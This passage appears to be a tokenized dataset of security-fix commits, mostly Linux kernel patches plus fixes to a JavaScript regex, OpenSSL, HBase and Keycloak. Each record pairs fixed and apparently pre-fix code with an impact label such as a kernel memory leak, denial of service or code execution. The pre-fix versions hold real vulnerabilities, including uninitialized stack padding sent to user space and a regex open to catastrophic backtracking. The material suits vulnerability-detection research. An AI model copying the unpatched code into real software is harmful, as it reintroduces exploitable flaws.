"0", ";", "}", "static", "int", "sa1100_irda_init_iobuf", "(", "iobuff_t", "*", "io", ",", "int", "size", ")", "{", "io", "-", ">", "head", "=", "kmalloc", "(", "size", ",", "GFP_KERNEL", "|", "GFP_DMA", ")", ";", "if", "(", "io", "-", ">", "head", "!", "=", "NULL", ")", "{", "io", "-", ">", "truesize", "=", "size", ";", "io", "-", ">", "in_frame", "=", "FALSE", ";", "io", "-", ">", "state", "=", "OUTSIDE_FRAME", ";", "io", "-", ">", "data", "=", "io", "-", ">", "head", ";", "}", "return", "io", "-", ">", "head", "?", "0", ":", "-", "ENOMEM", ";", "}", "static", "const", "struct", "net_device_ops", "sa1100_irda_netdev_ops", "=", "{", ".", "ndo_open", "=", "sa1100_irda_start", ",", ".", "ndo_stop", "=", "sa1100_irda_stop", ",", ".", "ndo_start_xmit", "=", "sa1100_irda_hard_xmit", ",", ".", "ndo_do_ioctl", "=", "sa1100_irda_ioctl", ",", "}", ";", "static", "int", "sa1100_irda_probe", "(", "struct", "platform_device", "*", "pdev", ")", "{", "struct", "net_device", "*", "dev", ";", "struct", "sa1100_irda", "*", "si", ";", "unsigned", "int", "baudrate_mask", ";", "int", "err", ",", "irq", ";", "if", "(", "!", "pdev", "-", ">", "dev", ".", "platform_data", ")", "return", "-", "EINVAL", ";", "irq", "=", "platform_get_irq", "(", "pdev", ",", "0", ")", ";", "if", "(", "irq", "<", "=", "0", ")", "return", "irq", "<", "0", "?", "irq", ":", "-", "ENXIO", ";", "err", "=", "request_mem_region", "(", "__PREG", "(", "Ser2UTCR0", ")", ",", "0x24", ",", "\"", "IrDA", "\"", ")", "?", "0", ":", "-", "EBUSY", ";", "if", "(", "err", ")", "goto", "err_mem_1", ";", "err", "=", "request_mem_region", "(", "__PREG", "(", "Ser2HSCR0", ")", ",", "0x1c", ",", "\"", "IrDA", "\"", ")", "?", "0", ":", "-", "EBUSY", ";", "if", "(", "err", ")", "goto", "err_mem_2", ";", "err", "=", "request_mem_region", "(", "__PREG", "(", "Ser2HSCR2", ")", ",", "0x04", ",", "\"", "IrDA", "\"", ")", "?", "0", ":", "-", "EBUSY", ";", "if", "(", "err", ")", "goto", "err_mem_3", ";", "dev", "=", "alloc_irdadev", "(", "sizeof", "(", "struct", "sa1100_irda", ")", ");", "if", "(", "!", "dev", ")", "{", "err", "=", "-", "ENOMEM", ";", "goto", "err_mem_4", ";", "}", "SET_NETDEV_DEV", "(", "dev", ",", "&", "pdev", "-", ">", "dev", ")", ";", "si", "=", "netdev_priv", "(", "dev", ")", ";", "si", "-", ">", "dev", "=", "&", "pdev", "-", ">", "dev", ";", "si", "-", ">", "pdata", "=", "pdev", "-", ">", "dev", ".", "platform_data", ";", "sg_init_table", "(", "&", "si", "-", ">", "dma_rx", ".", "sg", ",", "1", ")", ";", "sg_init_table", "(", "&", "si", "-", ">", "dma_tx", ".", "sg", ",", "1", ")", ";", "/", "*", "*", "Initialise", "the", "HP", "-", "SIR", "buffers", "*", "/", "err", "=", "sa1100_irda_init_iobuf", "(", "&", "si", "-", ">", "rx_buff", ",", "14384", ")", ";", "if", "(", "err", ")", "goto", "err_mem_5", ";", "err", "=", "sa1100_irda_init_iobuf", "(", "&", "si", "-", ">", "tx_buff", ",", "IRDA_SIR_MAX_FRAME", ")", ";", "if", "(", "err", ")", "goto", "err_mem_5", ";", "dev", "-", ">", "netdev_ops", "=", "&", "sa1100_irda_netdev_ops", ";", "dev", "-", ">", "irq", "=", "irq", ";", "irda_init_max_qos_capabilies", "(", "&", "si", "-", ">", "qos", ")", ";", "/", "*", "*", "We", "support", "original", "IRDA", "up", "to", "115k2", ".", "(", "we", "don", "'", "t", "currently", "*", "support", "4Mbps", ")", ".", "Min", "Turn", "Time", "set", "to", "1ms", "or", "greater", ".", "*", "/", "baudrate_mask", "=", "IR_9600", ";", "switch", "(", "max_rate", ")", "{", "case", "4000000", ":", "baudrate_mask", "|", "=", "IR_4000000", "<", "<", "8", ";", "case", "115200", ":", "baudrate_mask", "|", "=", "IR_115200", ";", "case", "57600", ":", "baudrate_mask", "|", "=", "IR_57600", ";", "case", "38400", ":", "baudrate_mask", "|", "=", "IR_38400", ";", "case", "19200", ":", "baudrate_mask", "|", "=", "IR_19200", ";", "}", "si", "-", ">", "qos", ".", "baud_rate", ".", "bits", "&", "=", "baudrate_mask", ";", "si", "-", ">", "qos", ".", "min_turn_time", ".", "bits", "=", "7", ";", "irda_qos_bits_to_value", "(", "&", "si", "-", ">", "qos", ")", ";", "si", "-", ">", "utcr4", "=", "UTCR4_HPSIR", ";", "if", "(", "tx_lpm", ")", "si", "-", ">", "utcr4", "|", "=", "UTCR4_Z1_6us", ";", "/", "*", "*", "Initially", "enable", "HP", "-", "SIR", "modulation", ",", "and", "ensure", "that", "the", "port", "*", "is", "disabled", ".", "*", "/", "Ser2UTCR3", "=", "0", ";", "Ser2UTCR4", "=", "si", "-", ">", "utcr4", ";", "Ser2HSCR0", "=", "HSCR0_UART", ";", "err", "=", "register_netdev", "(", "dev", ")", ";", "if", "(", "err", "=", "=", "0", ")", "platform_set_drvdata", "(", "pdev", ",", "dev", ")", ";", "if", "(", "err", ")", "{", "err_mem_5", ":", "kfree", "(", "si", "-", ">", "tx_buff", ".", "head", ")", ";", "kfree", "(", "si", "-", ">", "rx_buff", ".", "head", ")", ";", "free_netdev", "(", "dev", ")", ";", "err_mem_4", ":", "release_mem_region", "(", "__PREG", "(", "Ser2HSCR2", ")", ",", "0x04", ")", ";", "err_mem_3", ":", "release_mem_region", "(", "__PREG", "(", "Ser2HSCR0", ")", ",", "0x1c", ")", ";", "err_mem_2", ":", "release_mem_region", "(", "__PREG", "(", "Ser2UTCR0", ")", ",", "0x24", ")", ";", "}", "err_mem_1", ":", "return", "err", ";", "}", "static", "int", "sa1100_irda_remove", "(", "struct", "platform_device", "*", "pdev", ")", "{", "struct", "net_device", "*", "dev", "=", "platform_get_drvdata", "(", "pdev", ")", ";", "if", "(", "dev", ")", "{", "struct", "sa1100_irda", "*", "si", "=", "netdev_priv", "(", "dev", ")", ";", "unregister_netdev", "(", "dev", ")", ";", "kfree", "(", "si", "-", ">", "tx_buff", ".", "head", ")", ";", "kfree", "(", "si", "-", ">", "rx_buff", ".", "head", ")", ";", "free_netdev", "(", "dev", ")", ";", "}", "release_mem_region", "(", "__PREG", "(", "Ser2HSCR2", ")", ",", "0x04", ")", ";", "release_mem_region", "(", "__PREG", "(", "Ser2HSCR0", ")", ",", "0x1c", ")", ";", "release_mem_region", "(", "__PREG", "(", "Ser2UTCR0", ")", ",", "0x24", ")", ";", "return", "0", ";", "}", "#", "ifdef", "CONFIG_PM", "/", "*", "*", "Suspend", "the", "IrDA", "interface", ".", "*", "/", "static", "int", "sa1100_irda_suspend", "(", "struct", "platform_device", "*", "pdev", ",", "pm_message_t", "state", ")", "{", "struct", "net_device", "*", "dev", "=", "platform_get_drvdata", "(", "pdev", ")", ";", "struct", "sa1100_irda", "*", "si", ";", "if", "(", "!", "dev", ")", "return", "0", ";", "si", "=", "netdev_priv", "(", "dev", ")", ";", "if", "(", "si", "-", ">", "open", ")", "{", "/", "*", "*", "Stop", "the", "transmit", "queue", "*", "/", "netif_device_detach", "(", "dev", ")", ";", "disable_irq", "(", "dev", "-", ">", "irq", ")", ";", "sa1100_irda_shutdown", "(", "si", ")", ";", "__sa1100_irda_set_power", "(", "si", ",", "0", ")", ";", "}", "return", "0", ";", "}", "/", "*", "*", "Resume", "the", "IrDA", "interface", ".", "*", "/", "static", "int", "sa1100_irda_resume", "(", "struct", "platform_device", "*", "pdev", ")", "{", "struct", "net_device", "*", "dev", "=", "platform_get_drvdata", "(", "pdev", ")", ";", "struct", "sa1100_irda", "*", "si", ";", "if", "(", "!", "dev", ")", "return", "0", ";", "si", "=", "netdev_priv", "(", "dev", ")", ";", "if", "(", "si", "-", ">", "open", ")", "{", "/", "*", "*", "If", "we", "missed", "a", "speed", "change", ",", "initialise", "at", "the", "new", "speed", "*", "directly", ".", "It", "is", "debatable", "whether", "this", "is", "actually", "*", "required", ",", "but", "in", "the", "interests", "of", "continuing", "from", "where", "*", "we", "left", "off", "it", "is", "desirable", ".", "The", "converse", "argument", "is", "*", "that", "we", "should", "re", "-", "negotiate", "at", "9600", "baud", "again", ".", "*", "/", "if", "(", "si", "-", ">", "newspeed", ")", "{", "si", "-", ">", "speed", "=", "si", "-", ">", "newspeed", ";", "si", "-", ">", "newspeed", "=", "0", ";", "}", "sa1100_irda_startup", "(", "si", ")", ";", "__sa1100_irda_set_power", "(", "si", ",", "si", "-", ">", "power", ")", ";", "enable_irq", "(", "dev", "-", ">", "irq", ")", ";", "/", "*", "*", "This", "automatically", "wakes", "up", "the", "queue", "*", "/", "netif_device_attach", "(", "dev", ")", ";", "}", "return", "0", ";", "}", "#", "else", "#", "define", "sa1100_irda_suspend", "NULL", "#", "define", "sa1100_irda_resume", "NULL", "#", "endif", "static", "struct", "platform_driver", "sa1100ir_driver", "=", "{", ".", "probe", "=", "sa1100_irda_probe", ",", ".", "remove", "=", "sa1100_irda_remove", ",", ".", "suspend", "=", "sa1100_irda_suspend", ",", ".", "resume", "=", "sa1100_irda_resume", ",", ".", "driver", "=", "{", ".", "name", "=", "\"", "sa11x0", "-", "ir", "\"", ",", "}", ",", "}", ";", "static", "int", "__init", "sa1100_irda_init", "(", "void", ")", "{", "/", "*", "*", "Limit", "power", "level", "a", "sensible", "range", ".", "*", "/", "if", "(", "power_level", "<", "1", ")", "power_level", "=", "1", ";", "if", "(", "power_level", ">", "3", ")", "power_level", "=", "3", ";", "return", "platform_driver_register", "(", "&", "sa1100ir_driver", ")", ";", "}", "static", "void", "__exit", "sa1100_irda_exit", "(", "void", ")", "{", "platform_driver_unregister", "(", "&", "sa1100ir_driver", ")", ";", "}", "module_init", "(", "sa1100_irda_init", ")", ";", "module_exit", "(", "sa1100_irda_exit", ")", ";", "module_param", "(", "power_level", ",", "int", ",", "0", ")", ";", "module_param", "(", "tx_lpm", ",", "int", ",", "0", ")", ";", "module_param", "(", "max_rate", ",", "int", ",", "0", ")", ";", "MODULE_AUTHOR", "(", "\"", "Russell", "King", "<", "rmk", "@", "arm", ".", "linux", ".", "org", ".", "uk", ">", "\")", ";", "MODULE_DESCRIPTION", "(", "\"", "StrongARM", "SA1100", "IrDA", "driver", "\"", ");", "MODULE_LICENSE", "(", "\"", "GPL", "\"", ");", "MODULE_PARM_DESC", "(", "power_level", ",", "\"", "IrDA", "power", "level", ",", "1", "(", "low", ")", "to", "3", "(", "high", ")", "\")", ";", "MODULE_PARM_DESC", "(", "tx_lpm", ",", "\"", "Enable", "transmitter", "low", "power", "(", "1", ".", "6us", ")", "mode", "\"", ");", "MODULE_PARM_DESC", "(", "max_rate", ",", "\"", "Maximum", "baud", "rate", "(", "4000000", ",", "115200", ",", "57600", ",", "38400", ",", "19200", ",", "9600", ")", "\")", ";", "MODULE_ALIAS", "(", "\"", "platform", ":", "sa11x0", "-", "ir", "\"", ");"], "docstring_tokens": ["a", "denial", "of", "service", "(ias_object", "use-after-free", "and", "system", "crash", ")"]}
{"contents": ["core,", "nfqueue,", "openvswitch:", "Orphan", "frags", "in", "skb_zerocopy", "and", "handle", "errors", "skb_zerocopy", "can", "copy", "elements", "of", "the", "frags", "array", "between", "skbs,", "but", "it", "doesn't", "orphan", "them.", "Also,", "it", "doesn't", "handle", "errors,", "so", "this", "patch", "takes", "care", "of", "that", "as", "well,", "and", "modify", "the", "callers", "accordingly.", "skb_tx_error()", "is", "also", "added", "to", "the", "callers", "so", "they", "will", "signal", "the", "failed", "delivery", "towards", "the", "creator", "of", "the", "skb.", "Signed-off-by:", "Zoltan", "Kiss", "<zoltan.kiss@citrix.com>", "Signed-off-by:", "David", "S.", "Miller", "<davem@davemloft.net>"], "code_tokens": ["int", "skb_zerocopy", "(", "struct", "sk_buff", "*", "to", ",", "struct", "sk_buff", "*", "from", ",", "int", "len", ",", "int", "hlen", ")", ";", "*", "*", "Return", "value", ":", "*", "0", ":", "everything", "is", "OK", "*", "-", "ENOMEM", ":", "couldn", "'", "t", "orphan", "frags", "of", "@", "from", "due", "to", "lack", "of", "memory", "*", "-", "EFAULT", ":", "skb_copy_bits", "(", ")", "found", "some", "problem", "with", "skb", "geometry", "int", "skb_zerocopy", "(", "struct", "sk_buff", "*", "to", ",", "struct", "sk_buff", "*", "from", ",", "int", "len", ",", "int", "hlen", ")", "int", "ret", ";", "if", "(", "len", "<", "=", "skb_tailroom", "(", "to", ")", ")", "return", "skb_copy_bits", "(", "from", ",", "0", ",", "skb_put", "(", "to", ",", "len", ")", ",", "len", ")", ";", "ret", "=", "skb_copy_bits", "(", "from", ",", "0", ",", "skb_put", "(", "to", ",", "hlen", ")", ",", "hlen", ")", ";", "if", "(", "unlikely", "(", "ret", ")", ")", "return", "ret", ";", "if", "(", "unlikely", "(", "skb_orphan_frags", "(", "from", ",", "GFP_ATOMIC", ")", "))", "{", "skb_tx_error", "(", "from", ")", ";", "return", "-", "ENOMEM", ";", "}", "return", "0", ";", "if", "(", "!", "skb", ")", "{", "skb_tx_error", "(", "entskb", ")", ";", "}", "skb_tx_error", "(", "entskb", ")", ";", "if", "(", "skb_zerocopy", "(", "skb", ",", "entskb", ",", "data_len", ",", "hlen", ")", ")", "goto", "nla_put_failure", ";", "skb_tx_error", "(", "entskb", ")", ";", "err", "=", "skb_zerocopy", "(", "user_skb", ",", "skb", ",", "skb", "-", ">", "len", ",", "hlen", ")", ";", "if", "(", "err", ")", "goto", "out", ";", "if", "(", "err", ")", "skb_tx_error", "(", "skb", ")", ";</s>void", "skb_zerocopy", "(", "struct", "sk_buff", "*", "to", ",", "const", "struct", "sk_buff", "*", "from", ",", "int", "len", ",", "int", "hlen", ")", ";", "void", "skb_zerocopy", "(", "struct", "sk_buff", "*", "to", ",", "const", "struct", "sk_buff", "*", "from", ",", "int", "len", ",", "int", "hlen", ")", "if", "(", "len", "<", "=", "skb_tailroom", "(", "to", ")", ")", "{", "skb_copy_bits", "(", "from", ",", "0", ",", "skb_put", "(", "to", ",", "len", ")", ",", "len", ")", ";", "return", ";", "}", "skb_copy_bits", "(", "from", ",", "0", ",", "skb_put", "(", "to", ",", "hlen", ")", ",", "hlen", ")", ";", "if", "(", "!", "skb", ")", "skb_zerocopy", "(", "skb", ",", "entskb", ",", "data_len", ",", "hlen", ")", ";", "skb_zerocopy", "(", "user_skb", ",", "skb", ",", "skb", "-", ">", "len", ",", "hlen", ")", ";"], "docstring_tokens": ["obtain", "sensitive", "information", "from", "kernel", "memory"]}
{"contents": ["fix", "utc-millisec", "regex", "to", "avoid", "a", "ddos", "attack"], "code_tokens": ["exports", "[", "'", "utc", "-", "millisec", "'", "]", "=", "/", "^[", "0", "-", "9", "]", "{", "1", ",", "15", "}", "\\.", "?[", "0", "-", "9", "]", "{", "0", ",", "15", "}", "$/</s>exports", "[", "'", "utc", "-", "millisec", "'", "]", "=", "/", "^[", "0", "-", "9", "]", "+(", "\\.", "?[", "0", "-", "9", "]", "+)", "?$", "/"], "docstring_tokens": ["block", "the", "event", "loop", "and", "cause", "the", "application", "to", "hang"]}
{"contents": ["hrtimers:", "avoid", "overflow", "for", "large", "relative", "timeouts", "Relative", "hrtimers", "with", "a", "large", "timeout", "value", "might", "end", "up", "as", "negative", "timer", "values,", "when", "the", "current", "time", "is", "added", "in", "hrtimer_start().", "This", "in", "turn", "is", "causing", "the", "clockevents_set_next()", "function", "to", "set", "an", "huge", "timeout", "and", "sleep", "for", "quite", "a", "long", "time", "when", "we", "have", "a", "clock", "source", "which", "is", "capable", "of", "long", "sleeps", "like", "HPET.", "With", "PIT", "this", "almost", "goes", "unnoticed", "as", "the", "maximum", "delta", "is", "~27ms.", "The", "non-hrt/nohz", "code", "sorts", "this", "out", "in", "the", "next", "timer", "interrupt,", "so", "we", "never", "noticed", "that", "problem", "which", "has", "been", "there", "since", "the", "first", "day", "of", "hrtimers.", "This", "bug", "became", "more", "apparent", "in", "2.6.24", "which", "activates", "HPET", "on", "more", "hardware.", "Signed-off-by:", "Thomas", "Gleixner", "<tglx@linutronix.de>", "Signed-off-by:", "Ingo", "Molnar", "<mingo@elte.hu>"], "code_tokens": ["/", "*", "*", "Careful", "here", ":", "User", "space", "might", "have", "asked", "for", "a", "*", "very", "long", "sleep", ",", "so", "the", "add", "above", "might", "result", "in", "a", "*", "negative", "number", ",", "which", "enqueues", "the", "timer", "in", "front", "*", "of", "the", "queue", ".", "*", "/", "if", "(", "tim", ".", "tv64", "<", "0", ")", "tim", ".", "tv64", "=", "KTIME_MAX", ";</s>"], "docstring_tokens": ["overflow", "a", "buffer", "and", "execute", "arbitrary", "code", "on", "the", "system", "with", "elevated", "privileges", "or", "cause", "the", "system", "to", "crash"]}
{"contents": ["HBASE-20664", "Reduce", "the", "broad", "scope", "of", "outToken", "in", "ThriftHttpServlet", "Signed-off-by:", "Andrew", "Purtell", "<apurtell@apache.org>"], "code_tokens": ["final", "RemoteUserIdentity", "identity", "=", "doKerberosAuth", "(", "request", ")", ";", "effectiveUser", "=", "identity", ".", "principal", ";", "response", ".", "addHeader", "(", "WWW_AUTHENTICATE", ",", "NEGOTIATE", "+", "\"", "\"", "+", "identity", ".", "outToken", ")", ";", "private", "RemoteUserIdentity", "doKerberosAuth", "(", "HttpServletRequest", "request", ")", "return", "new", "RemoteUserIdentity", "(", "principal", ",", "action", ".", "outToken", ")", ";", "/", "**", "*", "Basic", "\"", "struct", "\"", "class", "to", "hold", "the", "final", "base64", "-", "encoded", ",", "authenticated", "GSSAPI", "token", "*", "for", "the", "user", "with", "the", "given", "principal", "talking", "to", "the", "Thrift", "server", ".", "*", "/", "private", "static", "class", "RemoteUserIdentity", "{", "final", "String", "outToken", ";", "final", "String", "principal", ";", "RemoteUserIdentity", "(", "String", "principal", ",", "String", "outToken", ")", "{", "this", ".", "principal", "=", "principal", ";", "this", ".", "outToken", "=", "outToken", ";", "}", "}</s>private", "String", "outToken", ";", "effectiveUser", "=", "doKerberosAuth", "(", "request", ")", ";", "response", ".", "addHeader", "(", "WWW_AUTHENTICATE", ",", "NEGOTIATE", "+", "\"", "\"", "+", "outToken", ")", ";", "private", "String", "doKerberosAuth", "(", "HttpServletRequest", "request", ")", "outToken", "=", "action", ".", "outToken", ";", "return", "principal", ";"], "docstring_tokens": ["authenticated", "sessions", "being", "incorrectly", "applied", "to", "users"]}
{"contents": ["xtensa:", "prevent", "arbitrary", "read", "in", "ptrace", "Prevent", "an", "arbitrary", "kernel", "read.", "Check", "the", "user", "pointer", "with", "access_ok()", "before", "copying", "data", "in.", "[akpm@linux-foundation.org:", "s/EIO/EFAULT/]", "Signed-off-by:", "Dan", "Rosenberg", "<drosenberg@vsecurity.com>", "Cc:", "Christian", "Zankel", "<chris@zankel.net>", "Cc:", "Oleg", "Nesterov", "<oleg@redhat.com>", "Cc:", "<stable@kernel.org>", "Signed-off-by:", "Andrew", "Morton", "<akpm@linux-foundation.org>", "Signed-off-by:", "Linus", "Torvalds", "<torvalds@linux-foundation.org>"], "code_tokens": ["if", "(", "!", "access_ok", "(", "VERIFY_READ", ",", "uregs", ",", "sizeof", "(", "elf_xtregs_t", ")", "))", "return", "-", "EFAULT", ";</s>"], "docstring_tokens": ["obtain", "sensitive", "information", "from", "kernel", "memory", "locations"]}
{"contents": ["net:", "clear", "heap", "allocations", "for", "privileged", "ethtool", "actions", "Several", "other", "ethtool", "functions", "leave", "heap", "uncleared", "(potentially)", "by", "drivers.", "Some", "interfaces", "appear", "safe", "(eeprom,", "etc),", "in", "that", "the", "sizes", "are", "well", "controlled.", "In", "some", "situations", "(e.g.", "unchecked", "error", "conditions),", "the", "heap", "will", "remain", "unchanged", "in", "areas", "before", "copying", "back", "to", "userspace.", "Note", "that", "these", "are", "less", "of", "an", "issue", "since", "these", "all", "require", "CAP_NET_ADMIN.", "Cc:", "stable@kernel.org", "Signed-off-by:", "Kees", "Cook", "<kees.cook@canonical.com>", "Acked-by:", "Ben", "Hutchings", "<bhutchings@solarflare.com>", "Signed-off-by:", "David", "S.", "Miller", "<davem@davemloft.net>"], "code_tokens": ["indir", "=", "kzalloc", "(", "full_size", ",", "GFP_USER", ")", ";", "data", "=", "kzalloc", "(", "gstrings", ".", "len", "*", "ETH_GSTRING_LEN", ",", "GFP_USER", ")", ";", "regbuf", "=", "kzalloc", "(", "reglen", ",", "GFP_USER", ")", ";</s>indir", "=", "kmalloc", "(", "full_size", ",", "GFP_USER", ")", ";", "data", "=", "kmalloc", "(", "gstrings", ".", "len", "*", "ETH_GSTRING_LEN", ",", "GFP_USER", ")", ";", "regbuf", "=", "kmalloc", "(", "reglen", ",", "GFP_USER", ")", ";"], "docstring_tokens": ["obtain", "potentially", "sensitive", "information", "from", "kernel", "heap", "memory"]}
{"contents": ["KVM:", "x86:", "Reload", "pit", "counters", "for", "all", "channels", "when", "restoring", "state", "Currently", "if", "userspace", "restores", "the", "pit", "counters", "with", "a", "count", "of", "0", "on", "channels", "1", "or", "2", "and", "the", "guest", "attempts", "to", "read", "the", "count", "on", "those", "channels,", "then", "KVM", "will", "perform", "a", "mod", "of", "0", "and", "crash.", "This", "will", "ensure", "that", "0", "values", "are", "converted", "to", "65536", "as", "per", "the", "spec.", "This", "is", ".", "Signed-off-by:", "Andy", "Honig", "<ahonig@google.com>", "Signed-off-by:", "Paolo", "Bonzini", "<pbonzini@redhat.com>"], "code_tokens": ["int", "i", ";", "for", "(", "i", "=", "0", ";", "i", "<", "3", ";", "i", "+", "+)", "kvm_pit_load_count", "(", "kvm", ",", "i", ",", "ps", "-", ">", "channels", "[", "i", "]", ".", "count", ",", "0", ")", ";", "int", "i", ";", "for", "(", "i", "=", "0", ";", "i", "<", "3", ";", "i", "+", "+)", "kvm_pit_load_count", "(", "kvm", ",", "i", ",", "kvm", "-", ">", "arch", ".", "vpit", "-", ">", "pit_state", ".", "channels", "[", "i", "]", ".", "count", ",", "start", ")", ";</s>kvm_pit_load_count", "(", "kvm", ",", "0", ",", "ps", "-", ">", "channels", "[", "0", "]", ".", "count", ",", "0", ")", ";", "kvm_pit_load_count", "(", "kvm", ",", "0", ",", "kvm", "-", ">", "arch", ".", "vpit", "-", ">", "pit_state", ".", "channels", "[", "0", "]", ".", "count", ",", "start", ")", ";"], "docstring_tokens": ["the", "host", "to", "crash"]}
{"contents": ["PR:", "2314", "Submitted", "by:", "Mounir", "IDRASSI", "<mounir.idrassi@idrix.net>", "Reviewed", "by:", "steve", "Fix", "for", "double", "free", "bug", "in", "ssl/s3_clnt.c"], "code_tokens": ["*", ")", "Fix", "for", "double", "free", "bug", "in", "ssl", "/", "s3_clnt", ".", "c", "CVE", "-", "2010", "-", "2939", "[", "Steve", "Henson", "]", "bn_ctx", "=", "NULL", ";</s>"], "docstring_tokens": ["execute", "arbitrary", "code", "in", "the", "context", "of", "the", "application", "using", "the", "vulnerable", "library"]}
{"contents": ["isofs:", "Fix", "unchecked", "printing", "of", "ER", "records", "We", "didn't", "check", "length", "of", "rock", "ridge", "ER", "records", "before", "printing", "them.", "Thus", "corrupted", "isofs", "image", "can", "cause", "us", "to", "access", "and", "print", "some", "memory", "behind", "the", "buffer", "with", "obvious", "consequences.", "Reported-and-tested-by:", "Carl", "Henrik", "Lunde", "<chlunde@ping.uio.no>", "CC:", "stable@vger.kernel.org", "Signed-off-by:", "Jan", "Kara", "<jack@suse.cz>"], "code_tokens": ["/", "*", "Invalid", "length", "of", "ER", "tag", "id", "?", "*", "/", "if", "(", "rr", "-", ">", "u", ".", "ER", ".", "len_id", "+", "offsetof", "(", "struct", "rock_ridge", ",", "u", ".", "ER", ".", "data", ")", ">", "rr", "-", ">", "len", ")", "goto", "out", ";</s>"], "docstring_tokens": ["obtain", "sensitive", "information", "from", "kernel", "memory"]}
{"contents": ["ALSA:", "timer:", "Fix", "leak", "in", "events", "via", "snd_timer_user_ccallback", "The", "stack", "object", "\u201cr1\u201d", "has", "a", "total", "size", "of", "32", "bytes.", "Its", "field", "\u201cevent\u201d", "and", "\u201cval\u201d", "both", "contain", "4", "bytes", "padding.", "These", "8", "bytes", "padding", "bytes", "are", "sent", "to", "user", "without", "being", "initialized.", "Signed-off-by:", "Kangjie", "Lu", "<kjlu@gatech.edu>", "Signed-off-by:", "Takashi", "Iwai", "<tiwai@suse.de>"], "code_tokens": ["memset", "(", "&", "r1", ",", "0", ",", "sizeof", "(", "r1", ")", ");</s>"], "docstring_tokens": ["obtain", "sensitive", "information", "from", "kernel", "stack", "memory"]}
{"contents": ["net:", "fix", "infoleak", "in", "rtnetlink", "The", "stack", "object", "\u201cmap\u201d", "has", "a", "total", "size", "of", "32", "bytes.", "Its", "last", "4", "bytes", "are", "padding", "generated", "by", "compiler.", "These", "padding", "bytes", "are", "not", "initialized", "and", "sent", "out", "via", "\u201cnla_put\u201d.", "Signed-off-by:", "Kangjie", "Lu", "<kjlu@gatech.edu>", "Signed-off-by:", "David", "S.", "Miller", "<davem@davemloft.net>"], "code_tokens": ["struct", "rtnl_link_ifmap", "map", ";", "memset", "(", "&", "map", ",", "0", ",", "sizeof", "(", "map", ")", ");", "map", ".", "mem_start", "=", "dev", "-", ">", "mem_start", ";", "map", ".", "mem_end", "=", "dev", "-", ">", "mem_end", ";", "map", ".", "base_addr", "=", "dev", "-", ">", "base_addr", ";", "map", ".", "irq", "=", "dev", "-", ">", "irq", ";", "map", ".", "dma", "=", "dev", "-", ">", "dma", ";", "map", ".", "port", "=", "dev", "-", ">", "if_port", ";</s>struct", "rtnl_link_ifmap", "map", "=", "{", ".", "mem_start", "=", "dev", "-", ">", "mem_start", ",", ".", "mem_end", "=", "dev", "-", ">", "mem_end", ",", ".", "base_addr", "=", "dev", "-", ">", "base_addr", ",", ".", "irq", "=", "dev", "-", ">", "irq", ",", ".", "dma", "=", "dev", "-", ">", "dma", ",", ".", "port", "=", "dev", "-", ">", "if_port", ",", "}", ";"], "docstring_tokens": ["obtain", "sensitive", "information", "from", "kernel", "stack", "memory"]}
{"contents": ["[KEYCLOAK-12192]", "-", "Missing", "Input", "Validation", "in", "IDP", "Authorization", "URLs"], "code_tokens": ["import", "java", ".", "net", ".", "MalformedURLException", ";", "import", "java", ".", "net", ".", "URL", ";", "import", "org", ".", "keycloak", ".", "common", ".", "enums", ".", "SslRequired", ";", "public", "static", "void", "checkUrl", "(", "SslRequired", "sslRequired", ",", "String", "url", ",", "String", "name", ")", "throws", "IllegalArgumentException", "{", "if", "(", "url", "=", "=", "null", ")", "{", "return", ";", "}", "URL", "parsed", ";", "try", "{", "parsed", "=", "new", "URL", "(", "url", ")", ";", "}", "catch", "(", "MalformedURLException", "e", ")", "{", "throw", "new", "IllegalArgumentException", "(", "\"", "The", "url", "[", "\"", "+", "name", "+", "\"", "]", "is", "malformed", "\"", ",", "e", ")", ";", "}", "String", "protocol", "=", "parsed", ".", "getProtocol", "(", ").", "toLowerCase", "(", ");", "if", "(", "!(", "\"", "http", "\"", ".", "equalsIgnoreCase", "(", "protocol", ")", "|", "|", "\"", "https", "\"", ".", "equalsIgnoreCase", "(", "protocol", ")", "))", "{", "throw", "new", "IllegalArgumentException", "(", "\"", "Invalid", "protocol", "/", "scheme", "for", "url", "[", "\"", "+", "name", "+", "\"", "]\"", ");", "}", "if", "(", "!\"", "https", "\"", ".", "equals", "(", "protocol", ")", "&", "&", "sslRequired", ".", "isRequired", "(", "url", ")", ")", "{", "throw", "new", "IllegalArgumentException", "(", "\"", "The", "url", "[", "\"", "+", "name", "+", "\"", "]", "requires", "secure", "connections", "\"", ");", "}", "}", "/", "**", "*", "<", "p", ">", "Creates", "a", "provider", "specific", "{", "@", "link", "IdentityProviderModel", "}", "instance", ".", "*", "*", "<", "p", ">", "Providers", "may", "want", "to", "implement", "their", "own", "{", "@", "link", "IdentityProviderModel", "}", "type", "so", "that", "validations", "*", "can", "be", "performed", "when", "managing", "the", "provider", "configuration", "*", "*", "@", "return", "the", "provider", "specific", "instance", "*", "/", "<", "C", "extends", "IdentityProviderModel", ">", "C", "createConfig", "(", ");", "import", "org", ".", "keycloak", ".", "broker", ".", "provider", ".", "IdentityProvider", ";", "import", "org", ".", "keycloak", ".", "broker", ".", "provider", ".", "IdentityProviderFactory", ";", "import", "org", ".", "keycloak", ".", "broker", ".", "social", ".", "SocialIdentityProvider", ";", "importIdentityProviders", "(", "rep", ",", "newRealm", ",", "session", ")", ";", "private", "static", "void", "importIdentityProviders", "(", "RealmRepresentation", "rep", ",", "RealmModel", "newRealm", ",", "KeycloakSession", "session", ")", "{", "newRealm", ".", "addIdentityProvider", "(", "toModel", "(", "newRealm", ",", "representation", ",", "session", ")", ");", "public", "static", "IdentityProviderModel", "toModel", "(", "RealmModel", "realm", ",", "IdentityProviderRepresentation", "representation", ",", "KeycloakSession", "session", ")", "{", "IdentityProviderFactory", "providerFactory", "=", "(", "IdentityProviderFactory", ")", "session", ".", "getKeycloakSessionFactory", "(", ").", "getProviderFactory", "(", "IdentityProvider", ".", "class", ",", "representation", ".", "getProviderId", "(", "))", ";", "if", "(", "providerFactory", "=", "=", "null", ")", "{", "providerFactory", "=", "(", "IdentityProviderFactory", ")", "session", ".", "getKeycloakSessionFactory", "(", ").", "getProviderFactory", "(", "SocialIdentityProvider", ".", "class", ",", "representation", ".", "getProviderId", "(", "))", ";", "}", "if", "(", "providerFactory", "=", "=", "null", ")", "{", "throw", "new", "IllegalArgumentException", "(", "\"", "Invalid", "identity", "provider", "id", "[", "\"", "+", "representation", ".", "getProviderId", "(", ")", "+", "\"", "]\"", ");", "}", "IdentityProviderModel", "identityProviderModel", "=", "providerFactory", ".", "createConfig", "(", ");", "identityProviderModel", ".", "validate", "(", "realm", ")", ";", "/", "**", 